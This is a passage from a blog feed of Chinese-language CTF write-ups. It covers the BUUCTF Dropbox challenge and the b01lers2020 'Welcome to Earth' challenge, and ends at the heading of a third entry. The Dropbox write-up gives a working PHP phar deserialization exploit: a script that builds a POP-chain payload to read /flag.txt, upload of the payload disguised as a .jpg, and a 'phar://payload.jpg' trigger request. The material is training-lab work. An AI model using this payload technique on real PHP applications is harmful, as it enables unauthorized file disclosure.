class="hljs-comment">// $this-&gt;filename = flag.txt </span><br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="download-php"><a href="#download-php" class="headerlink" title="download.php:"></a>download.php:</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-comment">//如果会话数组中login参数的值为空</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-comment">//检测filename参数是否为空</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-comment">//引用当前文件夹下的class.php文件</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;class.php&quot;</span>;<br><span class="hljs-comment">//限制访问目录为当前文件所在目录，/etc目录和/tmp目录</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;open_basedir&quot;</span>, <span class="hljs-title function_ invoke__">getcwd</span>() . <span class="hljs-string">&quot;:/etc:/tmp&quot;</span>);<br><br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;sandbox&#x27;</span>]);<br><span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>();<br><span class="hljs-variable">$filename</span> = (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br><span class="hljs-comment">//判断文件名的长度是否&lt;40,文件内容是否为空，文件名中是否存在flag，所以它是禁止我们访问有flag的文件，这里也暗示了网站内部可能存在flag文件名相关的文件</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$filename</span>) &lt; <span class="hljs-number">40</span> &amp;&amp; <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$filename</span>) &amp;&amp; <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;flag&quot;</span>) === <span class="hljs-literal">false</span>) &#123;<br>    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Content-type: application/octet-stream&quot;</span>);<br>    <span class="hljs-comment">//将文件名部分显示</span><br>    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Content-Disposition: attachment; filename=&quot;</span> . <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$filename</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;File not exist&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="delete-php"><a href="#delete-php" class="headerlink" title="delete.php:"></a>delete.php:</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-comment">// 检查用户是否登录</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-comment">// 检查文件名是否为空</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;class.php&quot;</span>;<br><br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;sandbox&#x27;</span>]);<br><span class="hljs-comment">// 申请文件类，存在于class.php中</span><br><span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>();<br><span class="hljs-comment">// 获取文件名</span><br><span class="hljs-variable">$filename</span> = (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br><span class="hljs-comment">// 判断文件名是否&lt;40</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$filename</span>) &lt; <span class="hljs-number">40</span> &amp;&amp; <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$filename</span>)) &#123;<br>    <span class="hljs-comment">// detele()函数可以触发file类中的unlink()函数的phar反序列化</span><br>    <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">detele</span>();<br>    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Content-type: application/json&quot;</span>);<br>    <span class="hljs-variable">$response</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;success&quot;</span> =&gt; <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;error&quot;</span> =&gt; <span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$response</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Content-type: application/json&quot;</span>);<br>    <span class="hljs-variable">$response</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;success&quot;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;error&quot;</span> =&gt; <span class="hljs-string">&quot;File not exist&quot;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$response</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="理想的链子"><a href="#理想的链子" class="headerlink" title="理想的链子:"></a>理想的链子:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs txt">1.触发文件打开函数:<br>$this-&gt;filename=flag.txt;<br>file_get_contents($this-&gt;filename);<br><br>2.触发File类的close()函数:<br>User-&gt;__destruct()=&gt;File-&gt;close<br><br>3.触发魔术方法__destruct()<br>new $User<br><br>delete.php=&gt;$file-&gt;detele();=&gt;unlink($this-&gt;filename);=&gt;User-&gt;__destruct()=&gt;File-&gt;close()<br>=&gt;file_get_contents($this-&gt;filename);<br><br></code></pre></td></tr></table></figure><p><strong>但是由于return file_get_contents($this-&gt;filename);只是返回函数的值，不能将函数的返回值显示到网页中，必须通过html语言或echo函数或print函数才能显示到网页中，所以需要利用FileList类的__destruct()函数</strong></p><h5 id="分析"><a href="#分析" class="headerlink" title="分析:"></a>分析:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs txt">FileList=&gt;__destruct():<br><br>foreach ($this-&gt;results as $filename =&gt; $result) &#123;<br>            $table .= &#x27;&lt;tr&gt;&#x27;;<br>            foreach ($result as $func =&gt; $value) &#123;<br>                $table .= &#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27; . htmlentities($value) . &#x27;&lt;/td&gt;&#x27;;<br>            &#125;<br>            $table .= &#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27; . htmlentities($filename) . &#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;;<br>            $table .= &#x27;&lt;/tr&gt;&#x27;;<br>        &#125;<br>        echo $table;<br>        <br></code></pre></td></tr></table></figure><p>该函数可以用于输出result结果集到网页中，所以我们需要这个结果集的内容为flag.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 通过调用该类的不存在函数可以触发该魔术方法</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;<br>        <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$this</span>-&gt;funcs, <span class="hljs-variable">$func</span>);<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;files <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>            <span class="hljs-comment">//对results结果集进行赋值</span><br>            <span class="hljs-comment">//可以让$file-&gt;$func();为File-&gt;close();</span><br>            <span class="hljs-variable language_">$this</span>-&gt;results[<span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">name</span>()][<span class="hljs-variable">$func</span>] = <span class="hljs-variable">$file</span>-&gt;<span class="hljs-variable">$func</span>();<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><h5 id="知识点介绍"><a href="#知识点介绍" class="headerlink" title="知识点介绍:"></a>知识点介绍:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs txt">$table .= &#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27; . htmlentities($func) . &#x27;&lt;/th&gt;&#x27;;<br>这段代码的作用是将变量 $func 的值经过 htmlentities() 函数进行 HTML 实体转换，并拼接到字符串 &#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27; 和 &#x27;&lt;/th&gt;&#x27; 之间，然后将结果追加到变量 $table 中。<br><br>htmlentities() 函数用于将字符串中的特殊字符转换为 HTML 实体，这样可以在 HTML 页面中安全地显示这些字符，避免被误解为 HTML 标签或其他语法。<br><br>例如，如果 $func 的值为 &quot;Hello World&quot;，经过 htmlentities() 转换后可能会变成 &quot;Hello World&quot;（假设原始字符串中没有特殊字符）。<br><br>最终，$table 变量可能会包含类似以下内容的字符串：<br><br>html<br>&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Hello World&lt;/th&gt;<br>这段代码的作用是在一个 HTML 表格的标题行中添加一个单元格，单元格内容为经过转义处理的 $func 变量的值。<br></code></pre></td></tr></table></figure><h3 id="构造phar反序列化链子"><a href="#构造phar反序列化链子" class="headerlink" title="构造phar反序列化链子:"></a>构造phar反序列化链子:</h3><h4 id="链子"><a href="#链子" class="headerlink" title="链子:"></a>链子:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs txt">1.触发文件打开函数:<br>$this-&gt;filename=flag.txt;<br>file_get_contents($this-&gt;filename);<br><br>2.触发File类的close()函数:<br>FileList-&gt;__call()=&gt;File-&gt;close=&gt;file_get_contents($this-&gt;filename);<br><br>3.触发FileList类的call函数:<br>User-&gt;$db=new FileList();<br>$this-&gt;db-&gt;close();=&gt;FileList-&gt;__call()=&gt;FileList-&gt;__call()=&gt;File-&gt;close=&gt;file_get_contents($this-&gt;filename);<br><br>4.触发$this-&gt;db-&gt;close();<br>User-&gt;__destruct()=&gt;$this-&gt;db-&gt;close();=&gt;FileList-&gt;__call()=&gt;FileList-&gt;__call()=&gt;File-&gt;close=&gt;file_get_contents($this-&gt;filename);<br></code></pre></td></tr></table></figure><h4 id="构造phar反序列化"><a href="#构造phar反序列化" class="headerlink" title="构造phar反序列化:"></a>构造phar反序列化:</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileList</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$files</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;files = <span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>());<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;/flag.txt&quot;</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$db</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br><span class="hljs-variable">$a</span>-&gt;db = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileList</span>();<br><br><span class="hljs-comment">// 删除当前文件夹下的payload.phar文件</span><br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;payload.phar&#x27;</span>);<br><span class="hljs-comment">// 生成的文件名为1.phar</span><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;payload.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;php __HALT_COMPILER(); ?&gt;&quot;</span>);<br><span class="hljs-variable">$o</span> = <span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br></code></pre></td></tr></table></figure><h3 id="将payload-phar文件后缀名改为payload-jpg后上传"><a href="#将payload-phar文件后缀名改为payload-jpg后上传" class="headerlink" title="将payload.phar文件后缀名改为payload.jpg后上传:"></a>将payload.phar文件后缀名改为payload.jpg后上传:</h3><p><img src="/images/2024-2-3-Dropbox/image-20240128202026584.png" alt="image-20240128202026584"></p><h3 id="使用抓包删除该文件"><a href="#使用抓包删除该文件" class="headerlink" title="使用抓包删除该文件:"></a>使用抓包删除该文件:</h3><p><img src="/images/2024-2-3-Dropbox/image-20240128202052113.png" alt="image-20240128202052113"></p><h3 id="触发delete-php的phar反序列化"><a href="#触发delete-php的phar反序列化" class="headerlink" title="触发delete.php的phar反序列化:"></a>触发delete.php的phar反序列化:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">filename=phar://payload.jpg<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-3-Dropbox/image-20240128202146031.png" alt="image-20240128202146031"></p><p>成功获取到flag:</p><p><img src="/images/2024-2-3-Dropbox/image-20240128202214425.png" alt="image-20240128202214425"></p><p>flag&#x3D;flag{336ab512-3062-4ec1-96e6-5ca89194615c}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF [b01lers2020]Welcome to Earth</title>
    <link href="/2024/02/03/2024-2-3-Welcome%20to%20Earth/"/>
    <url>/2024/02/03/2024-2-3-Welcome%20to%20Earth/</url>
    
    <content type="html"><![CDATA[<h2 id="b01lers2020-Welcome-to-Earth"><a href="#b01lers2020-Welcome-to-Earth" class="headerlink" title="[b01lers2020]Welcome to Earth"></a>[b01lers2020]Welcome to Earth</h2><p><img src="/images/2024-2-3-Welcome_to_Earth/image-20240129150044781.png" alt="image-20240129150044781"></p><h2 id="查看网页源代码"><a href="#查看网页源代码" class="headerlink" title="查看网页源代码:"></a>查看网页源代码:</h2><p><img src="/images/2024-2-3-Welcome_to_Earth/image-20240129150131509.png" alt="image-20240129150131509"></p><p>没有发现有用信息,但是网页的网址上出现&#x2F;die&#x2F;,猜测是进行了跳转，我们直接访问<a href="http://338a8f82-3c56-43a6-ba8e-a8c56b8f2b4f.node5.buuoj.cn:81/,%E5%B9%B6%E6%8A%93%E5%8C%85">http://338a8f82-3c56-43a6-ba8e-a8c56b8f2b4f.node5.buuoj.cn:81/,并抓包</a>:<br><img src="/images/2024-2-3-Welcome_to_Earth/image-20240129150309168.png" alt="image-20240129150309168"></p><h2 id="发现存在一个-chase-访问一下"><a href="#发现存在一个-chase-访问一下" class="headerlink" title="发现存在一个&#x2F;chase&#x2F;,访问一下:"></a>发现存在一个&#x2F;chase&#x2F;,访问一下:</h2><p><img src="/images/2024-2-3-Welcome_to_Earth/image-20240129150349909.png" alt="image-20240129150349909"></p><h2 id="响应中发现了-leftt-访问一下"><a href="#响应中发现了-leftt-访问一下" class="headerlink" title="响应中发现了&#x2F;leftt&#x2F;,访问一下:"></a>响应中发现了&#x2F;leftt&#x2F;,访问一下:</h2><p><img src="/images/2024-2-3-Welcome_to_Earth/image-20240129150431580.png" alt="image-20240129150431580"></p><h2 id="发现响应中有-shoot-访问一下"><a href="#发现响应中有-shoot-访问一下" class="headerlink" title="发现响应中有&#x2F;shoot&#x2F;,访问一下:"></a>发现响应中有&#x2F;shoot&#x2F;,访问一下:</h2><p><img src="/images/2024-2-3-Welcome_to_Earth/image-20240129150512943.png" alt="image-20240129150512943"></p><h2 id="发现响应中存在-door-访问一下："><a href="#发现响应中存在-door-访问一下：" class="headerlink" title="发现响应中存在&#x2F;door&#x2F;,访问一下："></a>发现响应中存在&#x2F;door&#x2F;,访问一下：</h2><p><img src="/images/2024-2-3-Welcome_to_Earth/image-20240129150557791.png" alt="image-20240129150557791"></p><h2 id="没有信息了，查看一下-static-js-door-js"><a href="#没有信息了，查看一下-static-js-door-js" class="headerlink" title="没有信息了，查看一下&#x2F;static&#x2F;js&#x2F;door.js:"></a>没有信息了，查看一下&#x2F;static&#x2F;js&#x2F;door.js:</h2><p><img src="/images/2024-2-3-Welcome_to_Earth/image-20240129150649703.png" alt="image-20240129150649703"></p><h2 id="发现存在一个-open-访问一下"><a href="#发现存在一个-open-访问一下" class="headerlink" title="发现存在一个&#x2F;open&#x2F;,访问一下:"></a>发现存在一个&#x2F;open&#x2F;,访问一下:</h2><p><img src="/images/2024-2-3-Welcome_to_Earth/image-20240129150721045.png" alt="image-20240129150721045"></p><h2 id="访问一下-static-js-open-sesame-js"><a href="#访问一下-static-js-open-sesame-js" class="headerlink" title="访问一下&#x2F;static&#x2F;js&#x2F;open_sesame.js:"></a>访问一下&#x2F;static&#x2F;js&#x2F;open_sesame.js:</h2><p><img src="/images/2024-2-3-Welcome_to_Earth/image-20240129150818071.png" alt="image-20240129150818071"></p><h2 id="发现存在一个-fight-访问一下"><a href="#发现存在一个-fight-访问一下" class="headerlink" title="发现存在一个&#x2F;fight&#x2F;,访问一下:"></a>发现存在一个&#x2F;fight&#x2F;,访问一下:</h2><p><img src="/images/2024-2-3-Welcome_to_Earth/image-20240129150857830.png" alt="image-20240129150857830"></p><h2 id="访问一下fight-js"><a href="#访问一下fight-js" class="headerlink" title="访问一下fight.js:"></a>访问一下fight.js:</h2><p><img src="/images/2024-2-3-Welcome_to_Earth/image-20240129150940013.png" alt="image-20240129150940013"></p><h2 id="发现flag相关信息"><a href="#发现flag相关信息" class="headerlink" title="发现flag相关信息:"></a>发现flag相关信息:</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">scramble</span>(<span class="hljs-params">flag, key</span>) &#123;<br>    <span class="hljs-comment">// 根据key的值和长度重新排列flag数组，从而获得flag</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; key.<span class="hljs-property">length</span>; i++) &#123;<br>        <span class="hljs-keyword">let</span> n = key.<span class="hljs-title function_">charCodeAt</span>(i) % flag.<span class="hljs-property">length</span>;<br>        <span class="hljs-keyword">let</span> temp = flag[i];<br>        flag[i] = flag[n];<br>        flag[n] = temp;<br>    &#125;<br>    <span class="hljs-keyword">return</span> flag;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">check_action</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// 获取id=action的输入框中的值，即我们输入的值</span><br>    <span class="hljs-keyword">var</span> action = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;action&quot;</span>).<span class="hljs-property">value</span>;<br>    <span class="hljs-comment">// 被打乱的flag数组</span><br>    <span class="hljs-keyword">var</span> flag = [<span class="hljs-string">&quot;&#123;hey&quot;</span>, <span class="hljs-string">&quot;_boy&quot;</span>, <span class="hljs-string">&quot;aaaa&quot;</span>, <span class="hljs-string">&quot;s_im&quot;</span>, <span class="hljs-string">&quot;ck!&#125;&quot;</span>, <span class="hljs-string">&quot;_baa&quot;</span>, <span class="hljs-string">&quot;aaaa&quot;</span>, <span class="hljs-string">&quot;pctf&quot;</span>];<br>    <span class="hljs-keyword">var</span> result = <span class="hljs-title function_">unscramble</span>(flag, action);<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;output&quot;</span>).<span class="hljs-property">innerText</span> = result;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="使用脚本复原flag"><a href="#使用脚本复原flag" class="headerlink" title="使用脚本复原flag:"></a>使用脚本复原flag:</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> permutations<br>flag = [<span class="hljs-string">&quot;&#123;hey&quot;</span>, <span class="hljs-string">&quot;_boy&quot;</span>, <span class="hljs-string">&quot;aaaa&quot;</span>, <span class="hljs-string">&quot;s_im&quot;</span>, <span class="hljs-string">&quot;ck!&#125;&quot;</span>, <span class="hljs-string">&quot;_baa&quot;</span>, <span class="hljs-string">&quot;aaaa&quot;</span>, <span class="hljs-string">&quot;pctf&quot;</span>]<br><span class="hljs-comment"># 一般比赛的flag都会是xxx比赛&#123;&#125;</span><br><span class="hljs-comment"># 所以猜测最终flag的格式为pctf&#123;&#125;</span><br><span class="hljs-comment"># 重新对flag进行编排顺序输出pctf&#123;&#125;</span><br><br><span class="hljs-comment"># 获取对flag列表所有组合排列的结果,返回一个迭代器</span><br>item = permutations(flag)<br><span class="hljs-comment"># print(item)</span><br><span class="hljs-comment"># 遍历item中所有的排列组合</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> item:<br>    <span class="hljs-comment"># 将每个排列组合转化为list列表后，将list列表中的每个元素中间以&#x27;&#x27;的方式连接在一起，形成整个字符串赋值给k</span><br>k = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">list</span>(i))<br>    <span class="hljs-comment"># 判断字符串k是否以pctf&#123;hey_boys开头，结尾是否以&#125;结尾</span><br><span class="hljs-keyword">if</span> k.startswith(<span class="hljs-string">&#x27;pctf&#123;hey_boys&#x27;</span>) <span class="hljs-keyword">and</span> k[-<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;&#125;&#x27;</span>:<br><span class="hljs-built_in">print</span>(k)<br><br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs txt">pctf&#123;hey_boys_imaaaa_baaaaaack!&#125;<br>pctf&#123;hey_boys_imaaaaaaaa_baack!&#125;<br>pctf&#123;hey_boys_im_baaaaaaaaaack!&#125;<br>pctf&#123;hey_boys_im_baaaaaaaaaack!&#125;<br>pctf&#123;hey_boys_imaaaaaaaa_baack!&#125;<br>pctf&#123;hey_boys_imaaaa_baaaaaack!&#125;<br></code></pre></td></tr></table></figure><p>最终测试得到flag&#x3D;pctf{hey_boys_im_baaaaaaaaaack!}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF [SWPUCTF 2018]SimplePHP</title>
    <link href="/2024/02/03/2024-2-3-SimplePHP/"/>
    <url>/2024/02/03/2024-2-3-SimplePHP/</url>
    
